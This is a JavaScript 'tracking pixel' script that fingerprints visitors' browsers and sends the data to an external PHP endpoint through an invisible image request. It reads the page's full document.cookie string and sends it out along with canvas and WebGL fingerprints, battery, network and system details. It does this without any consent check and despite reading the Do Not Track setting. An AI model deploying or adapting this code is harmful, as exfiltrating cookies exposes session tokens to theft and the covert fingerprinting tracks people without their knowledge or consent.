/**
 * Tracking Pixel Client Script
 * 
 * Usage:
 * <script src="tracker.js"></script>
 * 
 * Configuration:
 * Change the TRACKING_ENDPOINT to point to your hosted pixel file.
 */

const CONFIG = {
    // REPLACE THIS with your actual URL
    // Option A: Node.js Backend
    // TRACKING_ENDPOINT: 'http://your-domain.com/track', 

    // Option B: PHP Backend
    TRACKING_ENDPOINT: 'http://cowpoints.com/src/php/pixel.php',
    // local testing endpoint
    // TRACKING_ENDPOINT: 'http://localhost:5500/pixel.php',
};

(function () {
    // Helper: Simple text hash for fingerprinting
    const hashString = (str) => {
        let hash = 0;
        if (str.length === 0) return hash;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // Convert to 32bit integer
        }
        return hash.toString(16);
    };

    // Helper: Canvas Fingerprint
    const getCanvasFingerprint = () => {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.textBaseline = "alphabetic";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Hello World", 2, 15);
            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
            ctx.fillText("Hello World", 4, 17);
            return hashString(canvas.toDataURL());
        } catch (e) { return null; }
    };

    // Helper: Clean object data
    const cleanData = (obj) => {
        return Object.fromEntries(Object.entries(obj).filter(([_, v]) => v != null));
    };

    const collectData = async () => {
        const data = {
            // Screen & Window
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            colorDepth: window.screen.colorDepth,
            availWidth: window.screen.availWidth,
            availHeight: window.screen.availHeight,
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,

            // Time & Location
            timezoneOffset: new Date().getTimezoneOffset(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,

            // Browser / System
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(',') : '',
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,

            // --- NEW: Advanced Telemetry ---
            // 1. Touch Capability
            maxTouchPoints: navigator.maxTouchPoints,

            // 2. Network Information (Chrome/Android mostly)
            connectionType: navigator.connection ? navigator.connection.effectiveType : '',
            connectionRtt: navigator.connection ? navigator.connection.rtt : '',
            connectionSaveData: navigator.connection ? navigator.connection.saveData : '',

            // 3. User Preferences
            darkMode: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches,

            // 4. Fingerprinting
            canvasHash: getCanvasFingerprint(),

            // Tech
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,

            // Cookies (Captured)
            cookies: document.cookie,

            // Navigation
            referrer: document.referrer,
            pageTitle: document.title,
            url: window.location.href,
        };

        // 5. Battery Status (Async)
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                data.batteryLevel = battery.level;
                data.batteryCharging = battery.charging;
            }
        } catch (e) { }

        // Performance Metrics
        if (window.performance) {
            const nav = window.performance.getEntriesByType("navigation")[0];
            if (nav) {
                data.loadTime = nav.loadEventEnd;
            }
        }

        // WebGL Info
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    data.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    data.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch (e) { }

        return data;
    };

    const sendPixel = async () => {
        const data = await collectData();
        const params = new URLSearchParams(cleanData(data));

        const img = new Image();
        img.src = `${CONFIG.TRACKING_ENDPOINT}?${params.toString()}`;
        img.style.display = 'none';

        // Append to body to ensure request fires
        if (document.body) {
            document.body.appendChild(img);
        } else {
            // Fallback if script is in head and body isn't ready
            window.addEventListener('DOMContentLoaded', () => document.body.appendChild(img));
        }

        console.log("Tracking pixel fired:", data);
    };

    sendPixel();
})();
